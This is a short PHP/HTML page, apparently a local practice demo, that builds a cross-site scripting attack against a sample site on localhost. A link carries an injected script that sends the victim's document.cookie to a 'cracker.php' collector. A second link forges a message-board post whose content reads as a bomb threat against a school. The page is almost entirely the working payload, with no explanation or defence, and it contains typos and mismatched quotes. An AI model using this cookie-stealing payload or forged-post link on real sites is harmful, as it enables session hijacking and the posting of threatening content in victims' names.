<?php
require_once("cracker.php");
require_once("confirm.php");

setcookie("input", "user", time()+3600);
//echo htmlspecialchars(‘<script>alert(“hello!”)</script>’);
 ?>

<a href="http://localhost:8888/sample/confirm.php?
param=<script>document.location=&quot;
http://localhost:8888/sample/cracker.php?
cookie=&quot;+document.cookie</script>">Link to vulneralbe site</a>
<a href=“http://localhost:8888/sample/board.php?name=yourname&content=setbombtoschool" >Link to vulnerable site</a>

